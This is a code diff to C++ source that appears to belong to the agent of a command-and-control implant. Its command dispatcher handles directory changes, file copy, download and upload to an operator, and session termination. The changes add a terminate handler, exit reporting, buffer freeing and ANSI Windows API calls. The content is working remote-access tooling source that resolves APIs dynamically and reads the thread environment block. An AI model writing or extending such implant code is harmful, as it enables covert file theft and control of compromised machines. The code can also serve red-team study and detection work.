@@ -38,7 +38,8 @@ void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, Packer* outPacke
 		case COMMAND_PWD:       
 			this->CmdPwd(CommandId, inPacker, outPacker); break;
 		
-		case COMMAND_TERMINATE: break;
+		case COMMAND_TERMINATE: 
+			this->CmdTerminate(CommandId, inPacker, outPacker); break;
 		
 		case COMMAND_UPLOAD:
 			this->CmdUpload(CommandId, inPacker, outPacker); break;
@@ -49,6 +50,8 @@ void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, Packer* outPacke
 		default: break;
 		}
 	}
+
+	MemFreeLocal((LPVOID*)&recv, recvSize);
 }
 
 void Commander::CmdCd(ULONG commandId, Packer* inPacker, Packer* outPacker)
@@ -61,8 +64,10 @@ void Commander::CmdCd(ULONG commandId, Packer* inPacker, Packer* outPacker)
 
 	BOOL result = ApiWin->SetCurrentDirectoryA(path);
 	if (result) {
+		CHAR  currentPath[MAX_PATH] = { 0 };
+		ULONG currentPathSize = ApiWin->GetCurrentDirectoryA(MAX_PATH, currentPath);
 		outPacker->Pack32(commandId);
-		outPacker->PackBytes((PBYTE)path, pathSize);
+		outPacker->PackBytes((PBYTE)currentPath, currentPathSize);
 	}
 	else {
 		outPacker->Pack32(COMMAND_ERROR);
@@ -80,7 +85,7 @@ void Commander::CmdCp(ULONG commandId, Packer* inPacker, Packer* outPacker)
 
 	outPacker->Pack32(taskId);
 
-	BOOL result = ApiWin->CopyFile(src, dst, FALSE);
+	BOOL result = ApiWin->CopyFileA(src, dst, FALSE);
 	if (result) {
 		outPacker->Pack32(commandId);
 	}      
@@ -98,7 +103,7 @@ void Commander::CmdDownload(ULONG commandId, Packer* inPacker, Packer* outPacker
 
 	outPacker->Pack32(taskId);
 
-	HANDLE hFile = ApiWin->CreateFile(filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
+	HANDLE hFile = ApiWin->CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
 	if (!hFile || hFile == INVALID_HANDLE_VALUE) {
 		outPacker->Pack32(COMMAND_ERROR);
 		outPacker->Pack32(TEB->LastErrorValue);
@@ -199,6 +204,13 @@ void Commander::CmdPwd(ULONG commandId, Packer* inPacker, Packer* outPacker)
 	}
 }
 
+void Commander::CmdTerminate(ULONG commandId, Packer* inPacker, Packer* outPacker)
+{
+	agent->config->exit_method  = inPacker->Unpack32();
+	agent->config->exit_task_id = inPacker->Unpack32();
+	agent->SetActive(false);
+}
+
 void Commander::CmdUpload(ULONG commandId, Packer* inPacker, Packer* outPacker)
 {
 	ULONG memoryId = inPacker->Unpack32();
@@ -217,7 +229,7 @@ void Commander::CmdUpload(ULONG commandId, Packer* inPacker, Packer* outPacker)
 		bool  result  = false;
 		DWORD written = 0;
 
-		HANDLE hFile = ApiWin->CreateFile(path, GENERIC_WRITE, NULL, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
+		HANDLE hFile = ApiWin->CreateFileA(path, GENERIC_WRITE, NULL, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
 		if (hFile && hFile != INVALID_HANDLE_VALUE)
 			result = ApiWin->WriteFile(hFile, memData.buffer, memData.totalSize, &written, NULL);
 
@@ -252,4 +264,11 @@ void Commander::CmdSaveMemory(ULONG commandId, Packer* inPacker, Packer* outPack
 	ULONG taskId     = inPacker->Unpack32();
 
 	this->agent->memorysaver->WriteMemoryData(memoryId, totalSize, bufferSize, buffer);
+}
+
+void Commander::Exit(Packer* outPacker)
+{
+	outPacker->Pack32(agent->config->exit_task_id);
+	outPacker->Pack32(COMMAND_TERMINATE);
+	outPacker->Pack32(agent->config->exit_method);
 }
